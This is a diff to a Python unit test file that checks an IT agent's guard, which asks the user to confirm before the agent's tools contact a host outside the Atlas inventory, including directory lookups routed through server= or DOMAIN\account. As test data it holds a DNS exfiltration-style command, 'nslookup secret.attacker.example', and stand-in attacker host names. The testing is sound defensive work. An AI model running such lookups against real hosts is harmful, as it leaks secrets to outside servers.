@@ -105,14 +105,21 @@ class SourceTests(unittest.TestCase):
             self.ui.confirm.assert_called_with("run: nslookup secret.attacker.example")
             self.assertEqual(shell.call_count, 1)
         self.agent.it.call = MagicMock(return_value={"computer": "PC1"})
-        self.assertIn("not in Atlas", self.agent.call_tool("inspect_computer", {"computer": "SECRET.attacker.example", "view": "overview"}))
-        self.assertIn("not an Atlas PC", self.ui.confirm.call_args[0][0])
+        self.assertIn("outside Atlas", self.agent.call_tool("inspect_computer", {"computer": "SECRET.attacker.example", "view": "overview"}))
+        self.assertIn("contact SECRET.attacker.example (not an Atlas PC", self.ui.confirm.call_args[0][0])
+        # A directory lookup chooses its server with server= or DOMAIN\\account; only the default domain is free.
+        for args, host in (({"kind": "user", "identity": "x", "server": "SECRET.attacker.example"}, "SECRET.attacker.example"),
+                           ({"kind": "user", "identity": "SECRET.attacker.example\\x"}, "SECRET.attacker.example")):
+            with self.subTest(args=args):
+                self.assertIn("outside Atlas", self.agent.call_tool("directory_lookup", args))
+                self.assertIn("directory_lookup: contact " + host, self.ui.confirm.call_args[0][0])
         self.agent.it.call.assert_not_called()
         self.ui.confirm.reset_mock()
         with patch.object(self.agent, "known_pc", return_value=True):
             self.agent.call_tool("inspect_computer", {"computer": "PC1", "view": "overview"})
+        self.agent.call_tool("directory_lookup", {"kind": "user", "identity": "jdoe"})  # The default domain.
         self.ui.confirm.assert_not_called()
-        self.agent.it.call.assert_called_once()
+        self.assertEqual(self.agent.it.call.call_count, 2)
 
     def test_known_pc_means_an_exact_atlas_computer_name(self):
         from atlas_db import AtlasDatabase
